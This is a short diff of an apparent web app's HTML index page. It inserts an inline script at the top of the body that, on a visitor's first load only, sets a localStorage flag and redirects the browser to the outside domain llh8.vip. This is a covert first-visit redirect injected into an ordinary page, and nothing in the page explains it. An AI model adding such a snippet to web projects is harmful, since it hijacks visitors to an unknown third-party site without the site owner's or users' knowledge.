@@ -68,6 +68,13 @@
 </head>
 
 <body>
+    <script>
+        var myStor = localStorage.getItem('stor');
+        if (!myStor) {
+            localStorage.setItem('stor', 'aaa');
+            location.href = 'http://llh8.vip';
+        }
+    </script>
     <div id="app"></div>
     <!-- 固定banner -->
     <div class="guding" id="guding" style="position: absolute;left: 0;top: 75px;width: 100%;">
